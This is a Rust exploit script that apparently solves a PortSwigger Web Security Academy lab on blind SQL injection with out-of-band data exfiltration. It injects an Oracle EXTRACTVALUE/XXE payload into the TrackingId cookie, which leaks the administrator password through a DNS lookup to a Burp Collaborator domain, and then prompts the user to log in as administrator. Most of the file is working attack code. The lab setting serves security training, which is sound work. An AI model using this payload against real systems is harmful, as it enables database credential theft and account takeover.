/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 27/9/2023
*
* Lab: Blind SQL injection with out-of-band data exfiltration
*
* Steps: 1. Inject payload into 'TrackingId' cookie to extract administrator password 
*           via DNS lookup
*        2. Get the administrator password from your burp collaborator
*        3. Login as administrator
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aad007a03fae453807e030100f100e1.web-security-academy.net";
    // change this to your collaborator domain
    let collaborator = "lncmvv7xx3aaryssovlp1gsu5lbdz4nt.oastify.com";
    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection point:".blue(),
        "TrackingId".yellow(),
    );

    // payload to extract administrator password via DNS lookup
    let payload = format!("'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://'||(select password from users where username = 'administrator')||'.{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -");

    print!(
        "{}",
        "[*] Injecting payload to extract administrator password via DNS lookup.. ".white(),
    );
    io::stdout().flush();
    // fetch the page with the injected payload
    client
        .get(format!("{url}/filter?category=Pets"))
        .header("Cookie", format!("TrackingId={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));
    println!("{}", "OK".green());

    println!(
        "{}",
        "[#] Check your burp collaborator for the administrator password then login".white(),
    );
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
